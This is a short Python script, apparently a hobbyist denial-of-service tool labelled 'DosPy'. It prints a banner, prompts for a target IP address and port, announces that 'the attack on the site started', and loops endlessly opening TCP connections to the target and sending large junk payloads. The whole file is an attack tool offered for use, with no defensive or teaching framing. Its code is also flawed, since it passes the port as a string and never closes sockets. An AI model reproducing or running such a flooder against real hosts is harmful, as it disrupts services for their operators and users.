import socket
import time
from platform import system
import os
if system() == 'Linux':
    os.system('clear')
elif system() == 'Windows':
    os.system('cls')
    os.system('color a')
__version__ = '1.1'
Date_and_time_of_day = 'Time of day : '+time.ctime()
The_developer_team = 'Arab Python'
banner = """
                             """+__version__ +"""

                             """+Date_and_time_of_day+"""
 _____            _____       
|  __ \          |  __ \     """+The_developer_team+"""
| |  | | ___  ___| |__) |   _ 
| |  | |/ _ \/ __|  ___/ | | |
| |__| | (_) \__ \ |   | |_| |
|_____/ \___/|___/_|    \__, |
                         __/ |
                        |___/ 

"""
print(banner)
input_ip = str(input('Enter IP Address Plase :'))
input_port = input('\nEnter port open Plase :')
print("-"*30)
print("The attack on the site started please. If you want to stop, press Ctrl+C")
print("-"*30)
try:
	while True:
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		connect = sock.connect((input_ip,input_port))
		data = 'abcdefghjiklmnopqrstydlfkjlsfmlsmflsdmfldsmfklmsflsklfjsklfklsdfnmjsknrdklae'*1000
		time.sleep(1)
		sock.send(data.encode('utf-8'))
		print ("Attacking for ip address ",input_ip,"port is ",input_port)
except socket.error as err:
	raise err